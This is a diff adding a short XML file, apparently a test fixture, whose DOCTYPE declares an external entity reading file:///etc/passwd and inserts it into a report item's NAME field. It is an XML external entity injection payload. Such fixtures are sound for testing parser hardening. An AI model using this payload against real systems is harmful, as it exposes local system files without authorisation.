@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE REPORT [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<REPORT Title="Evil">
+  <ITEM ItemType="Volume">
+    <NAME>&xxe;</NAME>
+  </ITEM>
+</REPORT>
